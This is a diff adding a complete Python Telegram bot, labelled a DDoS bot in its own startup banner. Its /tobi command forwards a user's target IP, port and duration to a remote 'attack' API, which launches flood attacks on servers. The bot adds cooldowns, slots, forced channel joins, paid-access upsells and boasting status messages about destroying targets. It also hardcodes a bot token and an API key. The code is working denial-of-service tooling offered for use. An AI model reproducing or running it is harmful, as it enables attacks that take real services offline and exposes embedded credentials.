@@ -1,0 +1,821 @@
+# - Complete Working Bot with Individual Cooldown & Multiple Attacks
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import threading
+import os
+import re
+import requests
+import psutil
+import time
+import sys
+import json
+import logging
+from datetime import datetime, timedelta
+
+# Initialize logging configuration so logs show up in your VPS
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+
+# ============ IN-MEMORY STORAGE ============
+DATA_DIR = "bot_data_tobi"
+os.makedirs(DATA_DIR, exist_ok=True)
+
+# ============ CONFIGURATION ============
+BOT_START_TIME = datetime.now()
+BOT_TOKEN = "8971208470:AAEB0SAkXKvgBZhOk_qFaRhvaw1PgaM7-m8"
+BOT_OWNER = 8286263795
+_API_KEY = "qpMZA6JPG7ZDx4gC9cPoO3uO6YLlaOWq"
+_API_URL = "http://13.232.68.73:3938/attack"
+# --- FORCED CHANNEL JOIN CONFIGURATION ---
+REQUIRED_CHANNEL_ID = -1003995763917  
+REQUIRED_CHANNEL_LINK = "https://t.me/+GMRr-lMDpoYzYzVl"  
+
+# ============ ANTI-SPAM STATUS TRACKER ============
+last_status_messages = {}
+bot_users = {} 
+
+# ============ GROUP APPROVE SYSTEM ============
+approved_groups = set()
+pending_group_requests = {}
+
+# ============ API CONFIGURATION ============
+DEFAULT_MAX_SLOTS = 1
+MAX_SLOTS_LIMIT = 1
+current_max_slots = DEFAULT_MAX_SLOTS
+MIN_ATTACK_TIME = 10
+
+DEFAULT_MAX_ATTACK_TIME = 300
+DEFAULT_USER_COOLDOWN = 680
+
+# ============ FILE PATHS ============
+BOT_USERS_FILE = os.path.join(DATA_DIR, "bot_users.json")
+SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
+APPROVED_GROUPS_FILE = os.path.join(DATA_DIR, "approved_groups.json")
+FEEDBACK_REQUIRED_FILE = os.path.join(DATA_DIR, "pending_feedback.json")
+
+# ============ IN-MEMORY DATABASES ============
+approved_groups_db = set()
+
+# ============ JSON FUNCTIONS ============
+def load_json(file_path, default=None):
+    if default is None:
+        default = {}
+    if os.path.exists(file_path):
+        try:
+            with open(file_path, 'r') as f:
+                return json.load(f)
+        except:
+            return default
+    return default
+
+def save_json(file_path, data):
+    with open(file_path, 'w') as f:
+        json.dump(data, f, indent=2, default=str)
+        
+def get_setting(key, default=None):
+    settings = load_json(SETTINGS_FILE, {})
+    return settings.get(key, default)
+
+def set_setting(key, value):
+    settings = load_json(SETTINGS_FILE, {})
+    settings[key] = value
+    save_json(SETTINGS_FILE, settings)
+
+# ============ LOAD ALL DATA FUNCTION ============
+def load_all_data():
+    global bot_users
+    
+    if os.path.exists(BOT_USERS_FILE):
+        try:
+            with open(BOT_USERS_FILE, "r") as f:
+                bot_users = json.load(f)
+            logging.info(f"Successfully loaded {len(bot_users)} tracked users.")
+        except Exception as e:
+            logging.error(f"Error loading bot_users.json: {e}")
+            bot_users = {}
+    else:
+        bot_users = {}
+
+# Two separate cooldown dictionaries
+user_start_cooldowns = {}
+user_end_cooldowns = {}
+
+def load_approved_groups():
+    global approved_groups
+    if os.path.exists(APPROVED_GROUPS_FILE):
+        try:
+            data = load_json(APPROVED_GROUPS_FILE, [])
+            approved_groups = set(data)
+        except:
+            approved_groups = set()
+    else:
+        approved_groups = set()
+
+def save_approved_groups():
+    save_json(APPROVED_GROUPS_FILE, list(approved_groups))
+
+def is_group_approved(chat_id):
+    return chat_id in approved_groups
+
+def is_private_chat(message):
+    return message.chat.type == "private"
+
+def is_group_chat(message):
+    return message.chat.type in ["group", "supergroup"]
+
+def check_group_access(message):
+    if is_private_chat(message):
+        return True  
+    
+    if is_group_chat(message):
+        if not is_group_approved(message.chat.id):
+            safe_send_message(message.chat.id, 
+                "❌ This group is not approved!\n"
+                "Contact owner to approve this group.\n"
+                f"Group ID: {message.chat.id}\n"
+                "Use /request_access to request approval.",
+                reply_to=message, parse_mode="Markdown")
+            return False
+    return True
+
+def load_max_slots():
+    global current_max_slots
+    settings = load_json(SETTINGS_FILE, {})
+    saved_slots = settings.get('max_concurrent_slots', DEFAULT_MAX_SLOTS)
+    current_max_slots = saved_slots
+    print(f"📊 Loaded max slots: {current_max_slots}")
+
+def update_max_slots(new_slots):
+    global current_max_slots
+    if new_slots < 1 or new_slots > MAX_SLOTS_LIMIT:
+        return False
+    current_max_slots = new_slots
+    settings = load_json(SETTINGS_FILE, {})
+    settings['max_concurrent_slots'] = new_slots
+    save_json(SETTINGS_FILE, settings)
+    return True
+
+load_max_slots()
+
+# ============ BOT INITIALIZATION ============
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# ============ HELPER FUNCTIONS ============
+def is_feedback_pending(user_id):
+    data = load_json(FEEDBACK_REQUIRED_FILE, {})
+    return str(user_id) in data
+
+def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
+    try:
+        time.sleep(0.05)
+        reply_id = None
+        if reply_to:
+            reply_id = reply_to.message_id if hasattr(reply_to, 'message_id') else reply_to
+
+        if reply_id:
+            return bot.send_message(chat_id, text, reply_to_message_id=reply_id, parse_mode=parse_mode)
+        else:
+            return bot.send_message(chat_id, text, parse_mode=parse_mode)
+            
+    except telebot.apihelper.ApiTelegramException as e:
+        if e.error_code == 429:
+            retry_after = e.result_json.get('parameters', {}).get('retry_after', 2)
+            time.sleep(retry_after)
+            return safe_send_message(chat_id, text, reply_to, parse_mode)
+            
+        if e.error_code == 400 and "can't parse entities" in str(e):
+            if reply_to:
+                reply_id = reply_to.message_id if hasattr(reply_to, 'message_id') else reply_to
+                return bot.send_message(chat_id, text, reply_to_message_id=reply_id, parse_mode=None)
+            else:
+                return bot.send_message(chat_id, text, parse_mode=None)
+        return None
+    except:
+        return None
+
+def get_slot_status():
+    with _attack_lock:
+        now = datetime.now()
+        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
+        for k in expired:
+            if k in active_attacks:
+                del active_attacks[k]
+            if k in api_in_use:
+                del api_in_use[k]
+        
+        busy_slots = len(api_in_use)
+        free_slots = current_max_slots - busy_slots
+        return busy_slots, free_slots, current_max_slots
+
+def set_user_cooldown_start(user_id):
+    cooldown_time = 10
+    user_start_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)
+    return cooldown_time
+
+def set_user_cooldown_end(user_id):
+    cooldown_time = get_user_cooldown_setting()
+    user_end_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)
+    return cooldown_time
+
+def get_user_cooldown(user_id):
+    start_remaining = 0
+    end_remaining = 0
+    
+    if user_id in user_start_cooldowns:
+        remaining = (user_start_cooldowns[user_id] - datetime.now()).total_seconds()
+        if remaining > 0:
+            start_remaining = int(remaining)
+        else:
+            del user_start_cooldowns[user_id]
+    
+    if user_id in user_end_cooldowns:
+        remaining = (user_end_cooldowns[user_id] - datetime.now()).total_seconds()
+        if remaining > 0:
+            end_remaining = int(remaining)
+        else:
+            del user_end_cooldowns[user_id]
+    
+    return max(start_remaining, end_remaining)
+
+def send_attack(target, port, duration, method="UDPBOT"):
+    api_url = f"{_API_URL}?key={_API_KEY}&ip={target}&port={port}&time={duration}"
+    try:
+        logging.info(f"🎯 Requesting API for {target}:{port}")
+        response = requests.get(api_url, timeout=30)
+        if response.status_code == 200:
+            if "success" in response.text.lower() or "true" in response.text.lower():
+                logging.info(f"✅ Attack Success: {response.text[:100]}")
+                return True
+            else:
+                logging.error(f"❌ API Error: {response.text[:100]}")
+                return False
+        return False
+    except Exception as e:
+        logging.error(f"❌ Request error: {e}")
+        return False
+
+def get_max_attack_time():
+    try:
+        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
+    except:
+        return DEFAULT_MAX_ATTACK_TIME
+
+def get_user_cooldown_setting():
+    try:
+        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
+    except:
+        return DEFAULT_USER_COOLDOWN
+
+def is_maintenance():
+    return get_setting('maintenance_mode', False)
+
+def get_maintenance_msg():
+    return get_setting('maintenance_msg', '🔧 Bot is in maintenance mode. Please try again later.')
+
+def set_maintenance(enabled, msg=None):
+    set_setting('maintenance_mode', enabled)
+    if msg:
+        set_setting('maintenance_msg', msg)
+
+def check_maintenance(message):
+    if is_maintenance() and message.from_user.id != BOT_OWNER:
+        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
+        return True
+    return False
+
+def get_free_api_index():
+    with _attack_lock:
+        now = datetime.now()
+        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
+        for k in expired:
+            if k in active_attacks:
+                del active_attacks[k]
+            if k in api_in_use:
+                del api_in_use[k]
+        
+        busy_indices = set(api_in_use.values())
+        for i in range(current_max_slots):
+            if i not in busy_indices:
+                return i
+        return None
+
+def validate_target(target):
+    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
+    if ip_pattern.match(target):
+        parts = target.split('.')
+        for part in parts:
+            if int(part) > 255:
+                return False
+        return True
+    return False
+
+def user_has_active_attack(user_id):
+    with _attack_lock:
+        now = datetime.now()
+        for attack_id, attack in list(active_attacks.items()):
+            if attack['end_time'] <= now:
+                continue
+            if attack.get('user_id') == user_id:
+                return True
+        return False
+
+
+def is_owner(user_id):
+    return user_id == BOT_OWNER
+
+def send_long_message(message, text, parse_mode=None):
+    max_length = 4000
+    if len(text) <= max_length:
+        try:
+            safe_send_message(message.chat.id, text, reply_to=message, parse_mode=None)
+        except:
+            pass
+    else:
+        parts = []
+        current_part = ""
+        lines = text.split('\n')
+        for line in lines:
+            if len(current_part) + len(line) + 1 > max_length:
+                parts.append(current_part)
+                current_part = line + '\n'
+            else:
+                current_part += line + '\n'
+        if current_part:
+            parts.append(current_part)
+        for i, part in enumerate(parts):
+            try:
+                if i == 0:
+                    safe_send_message(message.chat.id, part, reply_to=message, parse_mode=None)
+                else:
+                    bot.send_message(message.chat.id, part)
+                time.sleep(0.3)
+            except:
+                pass
+
+def track_bot_user(user_id, username, first_name):
+    global bot_users
+    user_id = str(user_id)
+    if user_id not in bot_users:
+        bot_users[user_id] = {
+            "username": username or "N/A",
+            "first_name": first_name or "Unknown",
+            "first_seen": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        }
+        save_all_data()
+        logging.info(f"👤 New Member Tracked: {user_id} - {first_name}")
+
+def save_all_data():
+    try:
+        with open(BOT_USERS_FILE, "w") as f:
+            json.dump(bot_users, f, indent=4)
+    except Exception as e:
+        logging.error(f"Error saving user data: {e}")
+
+def build_global_status_message(user_id):
+    busy_slots, free_slots, total_slots = get_slot_status()
+   # response = "         🇸 🇹 🇦 🇹 🇺 🇸 \n"
+   # response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    
+    if active_attacks:
+        for attack_id, attack in active_attacks.items():
+            remaining = int((attack['end_time'] - datetime.now()).total_seconds())
+            if remaining > 0:
+                progress = int(((attack['duration'] - remaining) / attack['duration']) * 100)
+                filled = int(10 * progress / 100)
+                bar = "🟥" * filled + "⬜" * (max(0, 10 - filled))
+                
+                display_name = attack.get('attacker_display_name') or f"User_{attack.get('user_id')}"
+                safe_name = str(display_name).replace('<', '&lt;').replace('>', '&gt;')
+                
+                if len(safe_name) > 15:
+                    safe_name = safe_name[:12] + "..."
+                response = "👑 SUPREME COMMANDER: WAHID SAHAB 👑\n"
+                response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                response += f"🔥 ENGINE: ⚙️ SIGMA-VIP 🔥\n"
+                response += f"🎯 TARGET: {attack['target']}:{attack['port']} 🎯\n"
+                response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                response += "💀 DEADLINE PROGRESS:\n"
+                response += f"⚡  [{bar}] ⚡  {progress}%\n\n"
+                response += f"🕒 TIMELINE: {remaining}s / {attack['duration']}s\n"
+                response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                response += "🔞 DESTRUCTION LOG:\n"
+                response += "👉 TARGET KA SYSTEM AB KUTTE KI TARAH KARAAH RAHA HAI!\n"
+                response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                response += "💀 STATUS: SERVER AB IS DUNIYA MEIN NAHI RHA 💀\n"
+                response += "💥 NO MERCY - TOTAL DESTRUCTION! 💥\n"
+           
+    
+    else:
+        response += "💤 use ''/tobi ip port time'' to attack\n"
+        response += "────────────────────────\n"
+    if free_slots <= 0:
+     #   response += f"🔴 𝗦𝗟𝗢𝗧𝗦 𝗙𝗨𝗟𝗟: <b>{busy_slots}/{total_slots} </b>\n"
+     #   response += f"<blockquote>🚀 Tired of waiting? Bypass slots and get instant power! Contact @AkatsukiClan07 to buy premium.</blockquote>\n"
+        response += ""
+    else:
+     #   response += f"🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘: <b>{free_slots}/{total_slots}</b>\n"
+        response += ""
+        #response += "────────────────────────\n"
+    if user_has_active_attack(user_id):
+    #    response += "🛰️ <b>[ SESSION MONITOR ]</b>\n"
+    #    response += "┗ <code>YOUR ATTACK IS RUNNING...</code>\n"
+        response += ""
+    elif get_user_cooldown(user_id) > 0:
+       # response += f"🥶 <b>[ COOLING DOWN ]</b>\n"
+       # response += f"┗ <code>PLEASE WAIT {get_user_cooldown(user_id)}s BEFORE NEXT ATTACK...</code>\n"
+        response += f"check /status\n"
+    return response
+
+def update_status_loop(chat_id, message_id, user_id):
+    try:
+        update_count = 0
+        while update_count < 30:
+            time.sleep(2)
+            if not user_has_active_attack(user_id) and get_user_cooldown(user_id) == 0:
+                break
+            new_response = build_global_status_message(user_id)
+            try:
+                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id, parse_mode="HTML")
+                update_count += 1
+            except:
+                break
+    except:
+        pass
+
+def start_attack(target, port, duration, message, attack_id, api_index):
+    try:
+        user_id = message.from_user.id
+        username = message.from_user.username or message.from_user.first_name or str(user_id)
+        
+        set_user_cooldown_start(user_id)
+        
+        safe_send_message(message.chat.id, 
+            f"⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!\n"
+            f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧:{target}:{port}\n"
+            f"⏱️ 𝗧𝗜𝗠𝗘:{duration}s\n"
+            f"🥶 𝗦𝗧𝗔𝗥𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡:10s\n"
+            f"📊 𝖢𝙷𝖤𝖢𝖪 /status 𝖥𝖮𝖱 𝖴𝖯𝖣𝖠𝖳𝖤𝖲", 
+            reply_to=message)
+            
+        success = send_attack(target, port, duration)
+        if success:
+            print(f"✅ Attack sent successfully")
+        
+        time.sleep(duration)
+        
+        with _attack_lock:
+            if attack_id in active_attacks:
+                del active_attacks[attack_id]
+            if attack_id in api_in_use:
+                del api_in_use[attack_id]
+        
+        end_cooldown = set_user_cooldown_end(user_id)
+        success_msg = (
+             f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!\n"
+            f"🎯 𝙏𝘼𝙍𝙂𝙀𝙏: {target}:{port}\n"
+            f"⏱️ 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝐍: {duration}s\n"
+            f"🥶 𝗘🇳𝗗 𝘾𝙊𝙊𝙇𝘿𝙊𝙒🇳: {end_cooldown}s\n"
+            f"⚡ Please send attack screenshot to start your next attack!"
+        )
+        safe_send_message(message.chat.id, success_msg, reply_to=message)
+        
+    except Exception as e:
+        with _attack_lock:
+            if attack_id in active_attacks:
+                del active_attacks[attack_id]
+            if attack_id in api_in_use:
+                del api_in_use[attack_id]
+        print(f"Attack error: {e}")
+        
+def is_user_member(user_id):
+    if user_id == BOT_OWNER:
+        return True  
+    try:
+        member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
+        if member.status in ['creator', 'administrator', 'member']:
+            return True
+        return False
+    except:
+        return True 
+
+# ============ GLOBAL VARIABLES & LOCKS ============
+active_attacks = {}
+user_cooldowns = {}
+api_in_use = {}
+user_attack_history = {}
+_attack_lock = threading.Lock()
+_status_lock = threading.Lock()
+
+# ============ TELEGRAM COMMANDS ============
+@bot.message_handler(commands=["id"])
+def id_command(message):
+    user_id = message.from_user.id
+    safe_send_message(message.chat.id, f"{user_id}", reply_to=message, parse_mode="Markdown")
+
+@bot.message_handler(commands=["ping"])
+def ping_command(message):
+    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
+    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
+    hours = int(uptime_seconds // 3600)
+    minutes = int((uptime_seconds % 3600) // 60)
+    seconds = int(uptime_seconds % 60)
+    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
+    
+    response = f"🏓 Pong!\n"
+    response += f"• Bot Status: 🟢 Online\n"
+    response += f"• Maintenance Mode: {maintenance_status}\n"
+    response += f"• Uptime: {uptime_str}"
+    safe_send_message(message.chat.id, response, reply_to=message)
+
+@bot.message_handler(commands=["denygroup"])
+def deny_group_command(message):
+    if not is_owner(message.from_user.id): return
+    command_parts = message.text.split()
+    if len(command_parts) != 2: return
+    try:
+        group_id = int(command_parts[1])
+        if group_id in approved_groups:
+            approved_groups.remove(group_id)
+            save_approved_groups()
+            safe_send_message(message.chat.id, f"🚫 Group `{group_id}` denied access.", reply_to=message, parse_mode="Markdown")
+    except: pass
+        
+@bot.message_handler(commands=["approve_group"])
+def approve_group_command(message):
+    if not is_owner(message.from_user.id):
+        safe_send_message(message.chat.id, "❌ Only owner can approve groups!", reply_to=message)
+        return
+    command_parts = message.text.split()
+    if len(command_parts) != 2: return
+    try:
+        group_id = int(command_parts[1])
+        approved_groups.add(group_id)
+        save_approved_groups()
+        safe_send_message(message.chat.id, f"✅ Group {group_id} approved!", reply_to=message, parse_mode="Markdown")
+    except: pass
+
+@bot.message_handler(commands=["remove_group"])
+def remove_group_command(message):
+    if not is_owner(message.from_user.id): return
+    command_parts = message.text.split()
+    if len(command_parts) != 2: return
+    try:
+        group_id = int(command_parts[1])
+        if group_id in approved_groups:
+            approved_groups.remove(group_id)
+            save_approved_groups()
+            safe_send_message(message.chat.id, f"✅ Group {group_id} removed.", reply_to=message, parse_mode="Markdown")
+    except: pass
+
+@bot.message_handler(commands=["approved_groups"])
+def approved_groups_command(message):
+    if not is_owner(message.from_user.id): return
+    if not approved_groups:
+        safe_send_message(message.chat.id, "📋 No approved groups yet!", reply_to=message)
+        return
+    response = "✅ APPROVED GROUPS\n"
+    for gid in approved_groups:
+        response += f"• {gid}\n"
+    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
+
+@bot.message_handler(commands=["request_access"])
+def request_access_command(message):
+    if not is_group_chat(message): return
+    group_id = message.chat.id
+    if group_id in approved_groups: return
+    
+    owner_msg = f"📢 GROUP ACCESS REQUEST\n👥 Group: {message.chat.title}\n🆔 Group ID: {group_id}\nTo approve: /approve_group {group_id}"
+    try:
+        bot.send_message(BOT_OWNER, owner_msg, parse_mode="Markdown")
+        safe_send_message(message.chat.id, "✅ Request sent to owner!", reply_to=message)
+    except: pass
+
+@bot.message_handler(commands=["tobi"])
+def handle_attack(message):
+    if check_maintenance(message): return
+    
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    username = message.from_user.username
+    first_name = message.from_user.first_name
+    
+    if is_feedback_pending(user_id):
+        bot.reply_to(message, "❌ send screenshot of previous attack to start next attack!.")
+        return
+
+    if not is_user_member(user_id):
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("📢 Join Channel First", url=REQUIRED_CHANNEL_LINK))
+        prompt_text = f"❌ [𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗] ❌\nHey {first_name}, join our backup channel first!"
+        sent_warn = bot.reply_to(message, prompt_text, reply_markup=markup, parse_mode="Markdown")
+        threading.Timer(10.0, lambda: bot.delete_message(chat_id, message.message_id)).start()
+        threading.Timer(10.0, lambda: bot.delete_message(chat_id, sent_warn.message_id)).start()
+        return
+
+    track_bot_user(user_id, username, first_name)
+
+    if is_private_chat(message):     
+        safe_send_message(message.chat.id, "❌ This Bot is for Free Groups,\nContact Owner for personal Bot- @AkatsukiClan07", reply_to=message)
+        return
+    elif is_group_chat(message):
+        if not is_group_approved(message.chat.id):
+            safe_send_message(message.chat.id, "❌ This group is not approved!\nUse /request_access to request approval.", reply_to=message, parse_mode="Markdown")
+            return
+    
+    cooldown = get_user_cooldown(user_id)
+    if cooldown > 0:
+        response_text = f"🌸Wait: {cooldown}s"
+        sent_warn = safe_send_message(chat_id, response_text, reply_to=message)
+        if sent_warn:
+            threading.Timer(7.0, lambda: bot.delete_message(chat_id, message.message_id)).start()
+            threading.Timer(7.0, lambda: bot.delete_message(chat_id, sent_warn.message_id)).start()
+        return
+
+    busy_slots, free_slots, total_slots = get_slot_status()
+    if free_slots <= 0:
+        response_text = "❌ All slots are busy! Please wait."
+        sent_warn = safe_send_message(chat_id, response_text, reply_to=message)
+        if sent_warn:
+            threading.Timer(7.0, lambda: bot.delete_message(chat_id, message.message_id)).start()
+            threading.Timer(7.0, lambda: bot.delete_message(chat_id, sent_warn.message_id)).start()
+        return
+    
+    command_parts = message.text.split()
+    if len(command_parts) != 4:
+        safe_send_message(message.chat.id, "⚠️ Usage: /tobi <ip> <port> <time>", reply_to=message)
+        return
+    
+    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
+    if not validate_target(target): return
+    
+    try:
+        port = int(port)
+        if port < 10000 or port > 30000: return
+        duration = int(duration)
+        
+        max_time = get_max_attack_time()
+        if not is_owner(user_id) and duration > max_time:
+            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s.", reply_to=message)
+            return
+        
+        attack_id = f"{user_id}_{datetime.now().timestamp()}"
+        api_index = get_free_api_index()
+        if api_index is None: return
+        
+        with _attack_lock:
+            api_in_use[attack_id] = api_index
+            active_attacks[attack_id] = {
+                'target': target,
+                'port': port,
+                'duration': duration,
+                'user_id': user_id,
+                'attacker_display_name': first_name,
+                'start_time': datetime.now(),
+                'end_time': datetime.now() + timedelta(seconds=duration)
+            }
+        
+        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
+        thread.start()
+    except: pass
+
+@bot.message_handler(commands=["status"])
+def status_command(message):
+    if check_maintenance(message): return
+    
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    try: bot.delete_message(chat_id, message.message_id)
+    except: pass
+
+    with _status_lock:
+        if is_private_chat(message) and not is_owner(user_id):
+            bot.reply_to(message, "❌ DM FOR PAID BOT!\nOwner - @AkatsukiClan07")
+            return
+
+        response = build_global_status_message(user_id)
+        try:
+            old_msg_id = last_status_messages.get(chat_id)
+            sent_msg = bot.send_message(chat_id, response, parse_mode="HTML")
+            
+            if sent_msg and sent_msg.message_id:
+                last_status_messages[chat_id] = sent_msg.message_id
+                time.sleep(2.0)
+                if old_msg_id:
+                    try: bot.delete_message(chat_id, old_msg_id)
+                    except: pass
+
+            if user_has_active_attack(user_id) or get_user_cooldown(user_id) > 0:
+                thread = threading.Thread(target=update_status_loop, args=(chat_id, sent_msg.message_id, user_id))
+                thread.daemon = True
+                thread.start()
+        except: pass
+
+@bot.message_handler(commands=["max_concurrent"])
+def max_concurrent_command(message):
+    if not is_owner(message.from_user.id): return
+    command_parts = message.text.split()
+    if len(command_parts) != 2: return
+    try:
+        new_value = int(command_parts[1])
+        if new_value < 1 or new_value > MAX_SLOTS_LIMIT: return
+        update_max_slots(new_value)
+        safe_send_message(message.chat.id, f"✅ Max Concurrent Slots Updated to {new_value}!", reply_to=message)
+    except: pass
+
+@bot.message_handler(commands=["max_attack"])
+def max_attack_command(message):
+    if not is_owner(message.from_user.id): return
+    command_parts = message.text.split()
+    if len(command_parts) == 1:
+        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {get_max_attack_time()}s", reply_to=message)
+        return
+    try:
+        new_value = int(command_parts[1])
+        if new_value >= MIN_ATTACK_TIME:
+            set_setting('max_attack_time', new_value)
+            safe_send_message(message.chat.id, f"✅ Max Attack Time set: {new_value}s", reply_to=message)
+    except: pass
+
+@bot.message_handler(commands=["cooldown"])
+def cooldown_command(message):
+    if not is_owner(message.from_user.id): return
+    command_parts = message.text.split()
+    if len(command_parts) == 1:
+        safe_send_message(message.chat.id, f"🥶 Current Cooldown: {get_user_cooldown_setting()}s", reply_to=message)
+        return
+    try:
+        new_value = int(command_parts[1])
+        if new_value >= 0:
+            set_setting('user_cooldown', new_value)
+            safe_send_message(message.chat.id, f"✅ Cooldown set: {new_value}s", reply_to=message)
+    except: pass
+
+@bot.message_handler(commands=["maintenance"])
+def maintenance_command(message):
+    if not is_owner(message.from_user.id): return
+    command_parts = message.text.split(maxsplit=1)
+    if len(command_parts) < 2: return
+    msg = command_parts[1]
+    set_maintenance(True, msg)
+    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\nUse /ok to turn off", reply_to=message)
+
+@bot.message_handler(commands=["ok"])
+def ok_command(message):
+    if not is_owner(message.from_user.id): return
+    if not is_maintenance(): return
+    set_maintenance(False)
+    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!", reply_to=message)
+
+@bot.message_handler(commands=["live"])
+def live_stats_command(message):
+    if not is_owner(message.from_user.id): return
+    uptime = datetime.now() - BOT_START_TIME
+    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
+    minutes, _ = divmod(remainder, 60)
+    
+    process = psutil.Process()
+    memory_mb = process.memory_info().rss / 1024 / 1024
+    cpu_percent = process.cpu_percent(interval=0.1)
+    
+    busy_slots, free_slots, total_slots = get_slot_status()
+    
+    response = f"📊 SERVER STATISTICS\n• Uptime: {hours}h {minutes}m\n• Memory: {memory_mb:.1f} MB\n• CPU: {cpu_percent:.1f}%\n• Attacks: {busy_slots}/{total_slots}"
+    safe_send_message(message.chat.id, response, reply_to=message)
+
+@bot.message_handler(commands=["owner"])
+def owner_settings_command(message):
+    if not is_owner(message.from_user.id): return
+    _, free_slots, total_slots = get_slot_status()
+    help_text = f"👑 OWNER PANEL\n• Max Attack: {get_max_attack_time()}s\n• Cooldown: {get_user_cooldown_setting()}s\n• Slots: {free_slots}/{total_slots}"
+    safe_send_message(message.chat.id, help_text, reply_to=message)
+
+@bot.message_handler(commands=['help'])
+def show_help(message):
+    if check_maintenance(message): return
+    help_text = "🔐 COMMANDS:\n• /id - View your ID\n• /ping - Check bot status\n• /status - View attack status\n• /tobi <ip> <port> <time> - Start an attack"
+    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    if check_maintenance(message): return
+    response = f"👋 Welcome, {message.from_user.first_name}!\nUse /help to see available commands."
+    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
+
+# ============ BOT START SYSTEM ============
+print("=" * 60)
+print("🔥 TOBI DDOS BOT STARTING...")
+print("=" * 60)
+
+load_all_data()
+
+@bot.message_handler(func=lambda message: True)
+def silent_id_tracker(message):
+    track_bot_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
+    if message.text and message.text.startswith('/'):
+        return 
+
+if __name__ == "__main__":
+    load_all_data()
+    load_approved_groups()
+    print("🚀 Bot is live with stable connection fallback listeners!")
+    bot.infinity_polling(timeout=60, long_polling_timeout=60, allowed_updates=["message", "callback_query", "chat_member"])
